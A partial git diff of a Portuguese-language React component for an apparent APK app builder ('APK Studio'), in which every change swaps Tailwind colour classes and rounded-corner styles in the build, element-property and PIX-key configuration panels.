+                className="flex-1 py-3 bg-gradient-to-r from-[#ef4444] to-[#65a30d] hover:from-[#ef4444] hover:to-[#4d7c0f] text-[#10120a] rounded-md font-semibold flex items-center justify-center gap-2"
               >
                 ✅ Confirmar e Criar APK
               </button>
@@ -4640,7 +4640,7 @@ const APKStudio: React.FC = () => {
       {/* Modal de Download */}
       {buildStatus.downloadUrl && !buildStatus.isBuilding && (
         <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
-          <div className="bg-[#440e05] rounded-2xl p-8 max-w-md w-full mx-4">
+          <div className="bg-[#121214] rounded-md p-8 max-w-md w-full mx-4">
             <div className="text-center">
               <div className="w-16 h-16 bg-green-600 rounded-full flex items-center justify-center mx-auto mb-4">
                 <Check className="w-8 h-8 text-white" />
@@ -4650,7 +4650,7 @@ const APKStudio: React.FC = () => {
               <div className="flex gap-3">
                 <button
                   onClick={() => setBuildStatus({ isBuilding: false, progress: 0, message: '' })}
-                  className="flex-1 py-3 bg-slate-600 hover:bg-slate-500 text-white rounded-lg font-semibold"
+                  className="flex-1 py-3 bg-[#6f6f78] hover:bg-[#8b8b94] text-white rounded-md font-semibold"
                 >
                   Fechar
                 </button>
@@ -4676,7 +4676,7 @@ const APKStudio: React.FC = () => {
                       alert('Erro ao baixar APK. Tente novamente.');
                     }
                   }}
-                  className="flex-1 py-3 bg-green-600 hover:bg-green-700 text-white rounded-lg font-semibold flex items-center justify-center gap-2"
+                  className="flex-1 py-3 bg-green-600 hover:bg-green-700 text-white rounded-md font-semibold flex items-center justify-center gap-2"
                 >
                   <Download className="w-5 h-5" /> Baixar APK
                 </button>
@@ -4689,16 +4689,16 @@ const APKStudio: React.FC = () => {
       {/* Modal de Erro */}
       {buildStatus.error && !buildStatus.isBuilding && (
         <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
-          <div className="bg-[#440e05] rounded-2xl p-8 max-w-md w-full mx-4">
+          <div className="bg-[#121214] rounded-md p-8 max-w-md w-full mx-4">
             <div className="text-center">
-              <div className="w-16 h-16 bg-red-600 rounded-full flex items-center justify-center mx-auto mb-4">
+              <div className="w-16 h-16 bg-[#ef4444] rounded-full flex items-center justify-center mx-auto mb-4">
                 <AlertCircle className="w-8 h-8 text-white" />
               </div>
               <h3 className="text-xl font-bold text-white mb-2">Erro no Build</h3>
               <p className="text-gray-400 mb-6">{buildStatus.error}</p>
               <button
                 onClick={() => setBuildStatus({ isBuilding: false, progress: 0, message: '' })}
-                className="w-full py-3 bg-slate-600 hover:bg-slate-500 text-white rounded-lg font-semibold"
+                className="w-full py-3 bg-[#6f6f78] hover:bg-[#8b8b94] text-white rounded-md font-semibold"
               >
                 Fechar
               </button>
@@ -4729,8 +4729,8 @@ const ElementProperties: React.FC<{
       <div>
         <label className="text-gray-400 text-xs">Posição</label>
         <div className="flex gap-2 mt-1">
-          <input type="number" value={Math.round(element.x)} onChange={(e) => onUpdate({ x: parseInt(e.target.value) || 0 })} className="w-1/2 bg-slate-700 text-white px-2 py-1 rounded text-sm" placeholder="X" />
-          <input type="number" value={Math.round(element.y)} onChange={(e) => onUpdate({ y: parseInt(e.target.value) || 0 })} className="w-1/2 bg-slate-700 text-white px-2 py-1 rounded text-sm" placeholder="Y" />
+          <input type="number" value={Math.round(element.x)} onChange={(e) => onUpdate({ x: parseInt(e.target.value) || 0 })} className="w-1/2 bg-[#2a2a31] text-white px-2 py-1 rounded text-sm" placeholder="X" />
+          <input type="number" value={Math.round(element.y)} onChange={(e) => onUpdate({ y: parseInt(e.target.value) || 0 })} className="w-1/2 bg-[#2a2a31] text-white px-2 py-1 rounded text-sm" placeholder="Y" />
         </div>
       </div>
       
@@ -4738,8 +4738,8 @@ const ElementProperties: React.FC<{
       <div>
         <label className="text-gray-400 text-xs">Tamanho</label>
         <div className="flex gap-2 mt-1">
-          <input type="number" value={Math.round(element.width)} onChange={(e) => onUpdate({ width: parseInt(e.target.value) || 50 })} className="w-1/2 bg-slate-700 text-white px-2 py-1 rounded text-sm" placeholder="L" />
-          <input type="number" value={Math.round(element.height)} onChange={(e) => onUpdate({ height: parseInt(e.target.value) || 50 })} className="w-1/2 bg-slate-700 text-white px-2 py-1 rounded text-sm" placeholder="A" />
+          <input type="number" value={Math.round(element.width)} onChange={(e) => onUpdate({ width: parseInt(e.target.value) || 50 })} className="w-1/2 bg-[#2a2a31] text-white px-2 py-1 rounded text-sm" placeholder="L" />
+          <input type="number" value={Math.round(element.height)} onChange={(e) => onUpdate({ height: parseInt(e.target.value) || 50 })} className="w-1/2 bg-[#2a2a31] text-white px-2 py-1 rounded text-sm" placeholder="A" />
         </div>
       </div>
 
@@ -4748,17 +4748,17 @@ const ElementProperties: React.FC<{
         <>
           <div>
             <label className="text-gray-400 text-xs">Texto</label>
-            <input type="text" value={element.content || ''} onChange={(e) => onUpdate({ content: e.target.value })} className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm mt-1" />
+            <input type="text" value={element.content || ''} onChange={(e) => onUpdate({ content: e.target.value })} className="w-full bg-[#2a2a31] text-white px-2 py-1 rounded text-sm mt-1" />
           </div>
           <div>
             <label className="text-gray-400 text-xs">Tamanho da Fonte</label>
-            <input type="number" value={element.fontSize || 16} onChange={(e) => onUpdate({ fontSize: parseInt(e.target.value) || 16 })} className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm mt-1" />
+            <input type="number" value={element.fontSize || 16} onChange={(e) => onUpdate({ fontSize: parseInt(e.target.value) || 16 })} className="w-full bg-[#2a2a31] text-white px-2 py-1 rounded text-sm mt-1" />
           </div>
           <div>
             <label className="text-gray-400 text-xs">Cor do Texto</label>
             <div className="flex gap-2 mt-1">
               <input type="color" value={element.color || '#ffffff'} onChange={(e) => onUpdate({ color: e.target.value })} className="w-10 h-8 rounded cursor-pointer" />
-              <input type="text" value={element.color || '#ffffff'} onChange={(e) => onUpdate({ color: e.target.value })} className="flex-1 bg-slate-700 text-white px-2 py-1 rounded text-sm" />
+              <input type="text" value={element.color || '#ffffff'} onChange={(e) => onUpdate({ color: e.target.value })} className="flex-1 bg-[#2a2a31] text-white px-2 py-1 rounded text-sm" />
             </div>
           </div>
         </>
@@ -4769,15 +4769,15 @@ const ElementProperties: React.FC<{
         <>
           <div>
             <label className="text-gray-400 text-xs">Label</label>
-            <input type="text" value={element.inputLabel || ''} onChange={(e) => onUpdate({ inputLabel: e.target.value })} className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm mt-1" />
+            <input type="text" value={element.inputLabel || ''} onChange={(e) => onUpdate({ inputLabel: e.target.value })} className="w-full bg-[#2a2a31] text-white px-2 py-1 rounded text-sm mt-1" />
           </div>
           <div>
             <label className="text-gray-400 text-xs">Placeholder</label>
-            <input type="text" value={element.placeholder || ''} onChange={(e) => onUpdate({ placeholder: e.target.value })} className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm mt-1" />
+            <input type="text" value={element.placeholder || ''} onChange={(e) => onUpdate({ placeholder: e.target.value })} className="w-full bg-[#2a2a31] text-white px-2 py-1 rounded text-sm mt-1" />
           </div>
           <div>
             <label className="text-gray-400 text-xs">Tipo de Input</label>
-            <select value={element.inputType || 'text'} onChange={(e) => onUpdate({ inputType: e.target.value as any })} className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm mt-1">
+            <select value={element.inputType || 'text'} onChange={(e) => onUpdate({ inputType: e.target.value as any })} className="w-full bg-[#2a2a31] text-white px-2 py-1 rounded text-sm mt-1">
               <option value="text">Texto</option>
               <option value="password">Senha</option>
               <option value="numeric">Numérico</option>
@@ -4792,15 +4792,15 @@ const ElementProperties: React.FC<{
       {element.type === 'button' && (
         <div className="space-y-3">
           {/* ID do Elemento - Visível e Copiável */}
-          <div className="bg-[#290903] p-2 rounded border border-blue-500/25">
+          <div className="bg-[#1a1a1e] p-2 rounded border border-[#2a2a31]/25">
             <label className="text-gray-500 text-[10px] uppercase tracking-wider">🔑 ID do Elemento</label>
             <div className="flex items-center gap-1 mt-1">
-              <code className="flex-1 bg-[#440e05] text-green-400 px-2 py-1 rounded text-xs font-mono truncate">
+              <code className="flex-1 bg-[#121214] text-green-400 px-2 py-1 rounded text-xs font-mono truncate">
                 {element.id}
               </code>
               <button 
                 onClick={() => navigator.clipboard.writeText(element.id)}
-                className="px-2 py-1 bg-slate-700 hover:bg-slate-600 text-white rounded text-xs"
+                className="px-2 py-1 bg-[#2a2a31] hover:bg-[#6f6f78] text-white rounded text-xs"
                 title="Copiar ID"
               >
                 📋
@@ -4811,7 +4811,7 @@ const ElementProperties: React.FC<{
           {/* Ação do Botão */}
           <div>
             <label className="text-gray-400 text-xs">🎯 Ação do Botão</label>
-            <select value={element.buttonAction || 'next_screen'} onChange={(e) => onUpdate({ buttonAction: e.target.value as any })} className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm mt-1">
+            <select value={element.buttonAction || 'next_screen'} onChange={(e) => onUpdate({ buttonAction: e.target.value as any })} className="w-full bg-[#2a2a31] text-white px-2 py-1 rounded text-sm mt-1">
               <optgroup label="🔐 Autenticação">
                 <option value="login">🔓 Login (Autenticar no Servidor)</option>
                 <option value="logout">🚪 Logout</option>
@@ -4870,9 +4870,9 @@ const ElementProperties: React.FC<{
           </div>
 
           {/* Parâmetro da Ação (Backend) */}
-          <div className="bg-[#290903] p-2 rounded border border-blue-500/25">
+          <div className="bg-[#1a1a1e] p-2 rounded border border-[#2a2a31]/25">
             <label className="text-gray-500 text-[10px] uppercase tracking-wider">⚙️ Parâmetro API/Backend</label>
-            <code className="block bg-[#440e05] text-yellow-400 px-2 py-1 rounded text-xs font-mono mt-1">
+            <code className="block bg-[#121214] text-yellow-400 px-2 py-1 rounded text-xs font-mono mt-1">
               action: "{element.buttonAction || 'next_screen'}"
             </code>
             <p className="text-gray-500 text-[9px] mt-1">
@@ -4887,13 +4887,13 @@ const ElementProperties: React.FC<{
               <select 
                 value={element.targetScreenIndex ?? 0} 
                 onChange={(e) => onUpdate({ targetScreenIndex: parseInt(e.target.value) })} 
-                className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm mt-1"
+                className="w-full bg-[#2a2a31] text-white px-2 py-1 rounded text-sm mt-1"
               >
                 {screens.map((s, idx) => (
                   <option key={s.id} value={idx}>{idx + 1}. {s.name}</option>
                 ))}
               </select>
-              <code className="block bg-[#440e05] text-blue-400 px-2 py-1 rounded text-xs font-mono mt-1">
+              <code className="block bg-[#121214] text-[#ef4444] px-2 py-1 rounded text-xs font-mono mt-1">
                 targetScreenIndex: {element.targetScreenIndex ?? 0}
               </code>
             </div>
@@ -4902,28 +4902,28 @@ const ElementProperties: React.FC<{
           {element.buttonAction === 'open_url' && (
             <div>
               <label className="text-gray-400 text-xs">🌐 URL</label>
-              <input type="text" value={element.buttonUrl || ''} onChange={(e) => onUpdate({ buttonUrl: e.target.value })} className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm mt-1" placeholder="https://..." />
+              <input type="text" value={element.buttonUrl || ''} onChange={(e) => onUpdate({ buttonUrl: e.target.value })} className="w-full bg-[#2a2a31] text-white px-2 py-1 rounded text-sm mt-1" placeholder="https://..." />
             </div>
           )}
 
           {element.buttonAction === 'show_toast' && (
             <div>
               <label className="text-gray-400 text-xs">💬 Mensagem do Toast</label>
-              <input type="text" value={element.buttonUrl || ''} onChange={(e) => onUpdate({ buttonUrl: e.target.value })} className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm mt-1" placeholder="Mensagem..." />
+              <input type="text" value={element.buttonUrl || ''} onChange={(e) => onUpdate({ buttonUrl: e.target.value })} className="w-full bg-[#2a2a31] text-white px-2 py-1 rounded text-sm mt-1" placeholder="Mensagem..." />
             </div>
           )}
 
           {element.buttonAction === 'call_phone' && (
             <div>
               <label className="text-gray-400 text-xs">📞 Número de Telefone</label>
-              <input type="text" value={element.buttonUrl || ''} onChange={(e) => onUpdate({ buttonUrl: e.target.value })} className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm mt-1" placeholder="+5511999999999" />
+              <input type="text" value={element.buttonUrl || ''} onChange={(e) => onUpdate({ buttonUrl: e.target.value })} className="w-full bg-[#2a2a31] text-white px-2 py-1 rounded text-sm mt-1" placeholder="+5511999999999" />
             </div>
           )}
 
           {element.buttonAction === 'send_sms' && (
             <div>
               <label className="text-gray-400 text-xs">📱 Número para SMS</label>
-              <input type="text" value={element.buttonUrl || ''} onChange={(e) => onUpdate({ buttonUrl: e.target.value })} className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm mt-1" placeholder="+5511999999999" />
+              <input type="text" value={element.buttonUrl || ''} onChange={(e) => onUpdate({ buttonUrl: e.target.value })} className="w-full bg-[#2a2a31] text-white px-2 py-1 rounded text-sm mt-1" placeholder="+5511999999999" />
             </div>
           )}
 
@@ -4934,14 +4934,14 @@ const ElementProperties: React.FC<{
                 type="text" 
                 value={element.customAction || ''} 
                 onChange={(e) => onUpdate({ customAction: e.target.value })} 
-                className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm" 
+                className="w-full bg-[#2a2a31] text-white px-2 py-1 rounded text-sm" 
                 placeholder="minha_acao_customizada"
               />
               <label className="text-gray-400 text-xs">📝 Dados Extras (JSON)</label>
               <textarea 
                 value={element.customData || ''} 
                 onChange={(e) => onUpdate({ customData: e.target.value })} 
-                className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm h-16 font-mono" 
+                className="w-full bg-[#2a2a31] text-white px-2 py-1 rounded text-sm h-16 font-mono" 
                 placeholder='{"chave": "valor"}'
               />
               <p className="text-gray-500 text-[9px]">
@@ -4951,8 +4951,8 @@ const ElementProperties: React.FC<{
           )}
 
           {/* Resumo da Ação */}
-          <div className="bg-gradient-to-r from-orange-900/30 to-red-900/30 p-2 rounded border border-orange-600/50">
-            <p className="text-orange-400 text-[10px] font-bold mb-1">📡 ENDPOINT API</p>
+          <div className="bg-gradient-to-r from-[#1a1a1e]/30 to-[#1a1a1e]/30 p-2 rounded border border-[#84cc16]/50">
+            <p className="text-[#f87171] text-[10px] font-bold mb-1">📡 ENDPOINT API</p>
             <code className="block text-green-400 text-[10px] font-mono">
               POST /api/apk-studio/action
             </code>
@@ -4968,11 +4968,11 @@ const ElementProperties: React.FC<{
         <>
           <div>
             <label className="text-gray-400 text-xs">Valor (R$)</label>
-            <input type="text" value={element.pixAmount || ''} onChange={(e) => onUpdate({ pixAmount: e.target.value })} className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm mt-1" placeholder="10.00" />
+            <input type="text" value={element.pixAmount || ''} onChange={(e) => onUpdate({ pixAmount: e.target.value })} className="w-full bg-[#2a2a31] text-white px-2 py-1 rounded text-sm mt-1" placeholder="10.00" />
           </div>
           <div>
             <label className="text-gray-400 text-xs">Descrição</label>
-            <input type="text" value={element.pixDescription || ''} onChange={(e) => onUpdate({ pixDescription: e.target.value })} className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm mt-1" />
+            <input type="text" value={element.pixDescription || ''} onChange={(e) => onUpdate({ pixDescription: e.target.value })} className="w-full bg-[#2a2a31] text-white px-2 py-1 rounded text-sm mt-1" />
           </div>
         </>
       )}
@@ -4982,15 +4982,15 @@ const ElementProperties: React.FC<{
       {element.type === 'image' && (
         <div className="space-y-2">
           <label className="text-gray-400 text-xs">📷 Imagem</label>
-          <input type="file" accept="image/*" onChange={onImageUpload} className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm" />
+          <input type="file" accept="image/*" onChange={onImageUpload} className="w-full bg-[#2a2a31] text-white px-2 py-1 rounded text-sm" />
           <input 
             type="text" 
             value={element.imageUrl || ''} 
             onChange={(e) => onUpdate({ imageUrl: e.target.value })} 
-            className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm" 
+            className="w-full bg-[#2a2a31] text-white px-2 py-1 rounded text-sm" 
             placeholder="Ou cole URL da imagem..."
           />
-          {element.imageUrl && <img src={element.imageUrl} className="w-full h-20 object-contain rounded border border-blue-500/25" />}
+          {element.imageUrl && <img src={element.imageUrl} className="w-full h-20 object-contain rounded border border-[#2a2a31]/25" />}
         </div>
       )}
 
@@ -4998,15 +4998,15 @@ const ElementProperties: React.FC<{
       {element.type === 'logo' && (
         <div className="space-y-2">
           <label className="text-gray-400 text-xs">🏢 Logo</label>
-          <input type="file" accept="image/*" onChange={onImageUpload} className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm" />
+          <input type="file" accept="image/*" onChange={onImageUpload} className="w-full bg-[#2a2a31] text-white px-2 py-1 rounded text-sm" />
           <input 
             type="text" 
             value={element.imageUrl || ''} 
             onChange={(e) => onUpdate({ imageUrl: e.target.value })} 
-            className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm" 
+            className="w-full bg-[#2a2a31] text-white px-2 py-1 rounded text-sm" 
             placeholder="Ou cole URL do logo..."
           />
-          {element.imageUrl && <img src={element.imageUrl} className="w-16 h-16 object-cover rounded-full mx-auto border border-blue-500/25" />}
+          {element.imageUrl && <img src={element.imageUrl} className="w-16 h-16 object-cover rounded-full mx-auto border border-[#2a2a31]/25" />}
         </div>
       )}
 
@@ -5027,13 +5027,13 @@ const ElementProperties: React.FC<{
                 reader.readAsDataURL(file);
               }
             }} 
-            className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm" 
+            className="w-full bg-[#2a2a31] text-white px-2 py-1 rounded text-sm" 
           />
           <input 
             type="text" 
             value={element.videoUrl || ''} 
             onChange={(e) => onUpdate({ videoUrl: e.target.value })} 
-            className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm" 
+            className="w-full bg-[#2a2a31] text-white px-2 py-1 rounded text-sm" 
             placeholder="Ou cole URL do vídeo (YouTube, MP4...)"
           />
           <div className="grid grid-cols-2 gap-2 mt-2">
@@ -5074,13 +5074,13 @@ const ElementProperties: React.FC<{
                 reader.readAsDataURL(file);
               }
             }} 
-            className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm" 
+            className="w-full bg-[#2a2a31] text-white px-2 py-1 rounded text-sm" 
           />
           <input 
             type="text" 
             value={element.audioUrl || ''} 
             onChange={(e) => onUpdate({ audioUrl: e.target.value })} 
-            className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm" 
+            className="w-full bg-[#2a2a31] text-white px-2 py-1 rounded text-sm" 
             placeholder="Ou cole URL do áudio (MP3, WAV...)"
           />
           <div className="grid grid-cols-2 gap-2 mt-2">
@@ -5100,15 +5100,15 @@ const ElementProperties: React.FC<{
       {element.type === 'gif' && (
         <div className="space-y-2">
           <label className="text-gray-400 text-xs">🎞️ GIF Animado</label>
-          <input type="file" accept="image/gif" onChange={onImageUpload} className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm" />
+          <input type="file" accept="image/gif" onChange={onImageUpload} className="w-full bg-[#2a2a31] text-white px-2 py-1 rounded text-sm" />
           <input 
             type="text" 
             value={element.imageUrl || ''} 
             onChange={(e) => onUpdate({ imageUrl: e.target.value })} 
-            className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm" 
+            className="w-full bg-[#2a2a31] text-white px-2 py-1 rounded text-sm" 
             placeholder="Ou cole URL do GIF (Giphy, Tenor...)"
           />
-          {element.imageUrl && <img src={element.imageUrl} className="w-full h-20 object-contain rounded border border-blue-500/25" />}
+          {element.imageUrl && <img src={element.imageUrl} className="w-full h-20 object-contain rounded border border-[#2a2a31]/25" />}
         </div>
       )}
 
@@ -5120,7 +5120,7 @@ const ElementProperties: React.FC<{
             type="text" 
             value={element.imageUrl || ''} 
             onChange={(e) => onUpdate({ imageUrl: e.target.value })} 
-            className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm" 
+            className="w-full bg-[#2a2a31] text-white px-2 py-1 rounded text-sm" 
             placeholder="URL do JSON Lottie (lottiefiles.com)"
           />
           <div className="grid grid-cols-2 gap-2 mt-2">
@@ -5144,7 +5144,7 @@ const ElementProperties: React.FC<{
             type="text" 
             value={element.iconName || ''} 
             onChange={(e) => onUpdate({ iconName: e.target.value })} 
-            className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm text-2xl text-center" 
+            className="w-full bg-[#2a2a31] text-white px-2 py-1 rounded text-sm text-2xl text-center" 
             placeholder="Cole emoji aqui: 🔥 ⚡ 💰"
           />
           <div className="flex flex-wrap gap-1 mt-2">
@@ -5152,7 +5152,7 @@ const ElementProperties: React.FC<{
               <button 
                 key={emoji} 
                 onClick={() => onUpdate({ iconName: emoji })} 
-                className="w-8 h-8 bg-slate-600 hover:bg-slate-500 rounded text-lg"
+                className="w-8 h-8 bg-[#6f6f78] hover:bg-[#8b8b94] rounded text-lg"
               >
                 {emoji}
               </button>
@@ -5169,7 +5169,7 @@ const ElementProperties: React.FC<{
             type="text" 
             value={element.buttonUrl || ''} 
             onChange={(e) => onUpdate({ buttonUrl: e.target.value })} 
-            className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm" 
+            className="w-full bg-[#2a2a31] text-white px-2 py-1 rounded text-sm" 
             placeholder="https://exemplo.com"
           />
         </div>
@@ -5182,7 +5182,7 @@ const ElementProperties: React.FC<{
           <textarea 
             value={(element.options || []).join('\n')} 
             onChange={(e) => onUpdate({ options: e.target.value.split('\n').filter(o => o.trim()) })} 
-            className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm h-20" 
+            className="w-full bg-[#2a2a31] text-white px-2 py-1 rounded text-sm h-20" 
             placeholder="Opção 1&#10;Opção 2&#10;Opção 3"
           />
           <div>
@@ -5191,7 +5191,7 @@ const ElementProperties: React.FC<{
               type="text" 
               value={element.selectedValue || ''} 
               onChange={(e) => onUpdate({ selectedValue: e.target.value })} 
-              className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm mt-1" 
+              className="w-full bg-[#2a2a31] text-white px-2 py-1 rounded text-sm mt-1" 
             />
           </div>
         </div>
@@ -5204,15 +5204,15 @@ const ElementProperties: React.FC<{
           <div className="grid grid-cols-3 gap-2">
             <div>
               <label className="text-gray-500 text-xs">Min</label>
-              <input type="number" value={element.minValue || 0} onChange={(e) => onUpdate({ minValue: parseInt(e.target.value) })} className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm" />
+              <input type="number" value={element.minValue || 0} onChange={(e) => onUpdate({ minValue: parseInt(e.target.value) })} className="w-full bg-[#2a2a31] text-white px-2 py-1 rounded text-sm" />
             </div>
             <div>
               <label className="text-gray-500 text-xs">Max</label>
-              <input type="number" value={element.maxValue || 100} onChange={(e) => onUpdate({ maxValue: parseInt(e.target.value) })} className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm" />
+              <input type="number" value={element.maxValue || 100} onChange={(e) => onUpdate({ maxValue: parseInt(e.target.value) })} className="w-full bg-[#2a2a31] text-white px-2 py-1 rounded text-sm" />
             </div>
             <div>
               <label className="text-gray-500 text-xs">Valor</label>
-              <input type="number" value={element.currentValue || 50} onChange={(e) => onUpdate({ currentValue: parseInt(e.target.value) })} className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm" />
+              <input type="number" value={element.currentValue || 50} onChange={(e) => onUpdate({ currentValue: parseInt(e.target.value) })} className="w-full bg-[#2a2a31] text-white px-2 py-1 rounded text-sm" />
             </div>
           </div>
         </div>
@@ -5243,11 +5243,11 @@ const ElementProperties: React.FC<{
           <label className="text-gray-400 text-xs">⏱️ Timer</label>
           <div>
             <label className="text-gray-500 text-xs">Segundos</label>
-            <input type="number" value={element.timerSeconds || 60} onChange={(e) => onUpdate({ timerSeconds: parseInt(e.target.value) })} className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm" />
+            <input type="number" value={element.timerSeconds || 60} onChange={(e) => onUpdate({ timerSeconds: parseInt(e.target.value) })} className="w-full bg-[#2a2a31] text-white px-2 py-1 rounded text-sm" />
           </div>
           <div>
             <label className="text-gray-500 text-xs">Formato</label>
-            <select value={element.timerFormat || 'mm:ss'} onChange={(e) => onUpdate({ timerFormat: e.target.value })} className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm">
+            <select value={element.timerFormat || 'mm:ss'} onChange={(e) => onUpdate({ timerFormat: e.target.value })} className="w-full bg-[#2a2a31] text-white px-2 py-1 rounded text-sm">
               <option value="mm:ss">MM:SS</option>
               <option value="hh:mm:ss">HH:MM:SS</option>
               <option value="ss">Só segundos</option>
@@ -5255,7 +5255,7 @@ const ElementProperties: React.FC<{
           </div>
           <div>
             <label className="text-gray-500 text-xs">Ao terminar</label>
-            <select value={element.onTimerEnd || 'next_screen'} onChange={(e) => onUpdate({ onTimerEnd: e.target.value as 'next_screen' | 'submit' | 'close' })} className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm">
+            <select value={element.onTimerEnd || 'next_screen'} onChange={(e) => onUpdate({ onTimerEnd: e.target.value as 'next_screen' | 'submit' | 'close' })} className="w-full bg-[#2a2a31] text-white px-2 py-1 rounded text-sm">
               <option value="next_screen">Próxima tela</option>
               <option value="submit">Enviar dados</option>
               <option value="close">Fechar app</option>
@@ -5270,7 +5270,7 @@ const ElementProperties: React.FC<{
           <label className="text-gray-400 text-xs">Cor de Fundo</label>
           <div className="flex gap-2 mt-1">
             <input type="color" value={element.backgroundColor || '#333333'} onChange={(e) => onUpdate({ backgroundColor: e.target.value })} className="w-10 h-8 rounded cursor-pointer" />
-            <input type="text" value={element.backgroundColor || '#333333'} onChange={(e) => onUpdate({ backgroundColor: e.target.value })} className="flex-1 bg-slate-700 text-white px-2 py-1 rounded text-sm" />
+            <input type="text" value={element.backgroundColor || '#333333'} onChange={(e) => onUpdate({ backgroundColor: e.target.value })} className="flex-1 bg-[#2a2a31] text-white px-2 py-1 rounded text-sm" />
           </div>
         </div>
       )}
@@ -5279,7 +5279,7 @@ const ElementProperties: React.FC<{
       {(element.type === 'button' || element.type === 'rectangle' || element.type === 'input' || element.type === 'pix_qrcode' || element.type === 'pix_copypaste') && (
         <div>
           <label className="text-gray-400 text-xs">Borda Arredondada</label>
-          <input type="number" value={element.borderRadius || 0} onChange={(e) => onUpdate({ borderRadius: parseInt(e.target.value) || 0 })} className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm mt-1" />
+          <input type="number" value={element.borderRadius || 0} onChange={(e) => onUpdate({ borderRadius: parseInt(e.target.value) || 0 })} className="w-full bg-[#2a2a31] text-white px-2 py-1 rounded text-sm mt-1" />
         </div>
       )}
 
@@ -5289,7 +5289,7 @@ const ElementProperties: React.FC<{
         <input type="range" min="0" max="100" value={element.opacity || 100} onChange={(e) => onUpdate({ opacity: parseInt(e.target.value) })} className="w-full mt-1" />
       </div>
 
-      <button onClick={onDelete} className="w-full py-2 bg-red-600 hover:bg-red-700 text-white rounded-lg text-sm font-semibold flex items-center justify-center gap-2">
+      <button onClick={onDelete} className="w-full py-2 bg-[#ef4444] hover:bg-[#f87171] text-white rounded-md text-sm font-semibold flex items-center justify-center gap-2">
         <Trash2 className="w-4 h-4" /> Excluir
       </button>
     </div>
@@ -5308,14 +5308,14 @@ const ScreenProperties: React.FC<{
       
       <div>
         <label className="text-gray-400 text-xs">Nome da Tela</label>
-        <input type="text" value={screen.name} onChange={(e) => onUpdate({ name: e.target.value })} className="w-full bg-slate-700 text-white px-2 py-1 rounded text-sm mt-1" />
+        <input type="text" value={screen.name} onChange={(e) => onUpdate({ name: e.target.value })} className="w-full bg-[#2a2a31] text-white px-2 py-1 rounded text-sm mt-1" />
       </div>
       
       <div>
         <label className="text-gray-400 text-xs">Cor de Fundo</label>
         <div className="flex gap-2 mt-1">
           <input type="color" value={screen.backgroundColor} onChange={(e) => onUpdate({ backgroundColor: e.target.value })} className="w-10 h-8 rounded cursor-pointer" />
-          <input type="text" value={screen.backgroundColor} onChange={(e) => onUpdate({ backgroundColor: e.target.value })} className="flex-1 bg-slate-700 text-white px-2 py-1 rounded text-sm" />
+          <input type="text" value={screen.backgroundColor} onChange={(e) => onUpdate({ backgroundColor: e.target.value })} className="flex-1 bg-[#2a2a31] text-white px-2 py-1 rounded text-sm" />
         </div>
       </div>
       
@@ -5343,10 +5343,10 @@ const PixConfigModal: React.FC<{
 
   return (
     <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50 p-4">
-      <div className="bg-[#440e05] rounded-xl w-full max-w-md p-6">
+      <div className="bg-[#121214] rounded-md w-full max-w-md p-6">
         <div className="flex items-center justify-between mb-6">
           <h2 className="text-xl font-bold text-white">{config ? '✏️ Editar' : '➕ Nova'} Chave PIX</h2>
-          <button onClick={onClose} className="p-2 bg-slate-700 hover:bg-slate-600 text-white rounded-lg">
+          <button onClick={onClose} className="p-2 bg-[#2a2a31] hover:bg-[#6f6f78] text-white rounded-md">
             <X className="w-5 h-5" />
           </button>
         </div>
@@ -5354,12 +5354,12 @@ const PixConfigModal: React.FC<{
         <div className="space-y-4">
           <div>
             <label className="text-gray-400 text-sm">Nome Identificador</label>
-            <input type="text" value={form.name} onChange={(e) => setForm({ ...form, name: e.target.value })} className="w-full bg-slate-700 text-white px-3 py-2 rounded mt-1" placeholder="Ex: PIX Principal" />
+            <input type="text" value={form.name} onChange={(e) => setForm({ ...form, name: e.target.value })} className="w-full bg-[#2a2a31] text-white px-3 py-2 rounded mt-1" placeholder="Ex: PIX Principal" />
           </div>
           
           <div>
             <label className="text-gray-400 text-sm">Tipo de Chave</label>
-            <select value={form.pixKeyType} onChange={(e) => setForm({ ...form, pixKeyType: e.target.value as any })} className="w-full bg-slate-700 text-white px-3 py-2 rounded mt-1">
+            <select value={form.pixKeyType} onChange={(e) => setForm({ ...form, pixKeyType: e.target.value as any })} className="w-full bg-[#2a2a31] text-white px-3 py-2 rounded mt-1">
               <option value="cpf">CPF</option>
               <option value="cnpj">CNPJ</option>
               <option value="email">E-mail</option>
@@ -5370,17 +5370,17 @@ const PixConfigModal: React.FC<{
           
           <div>
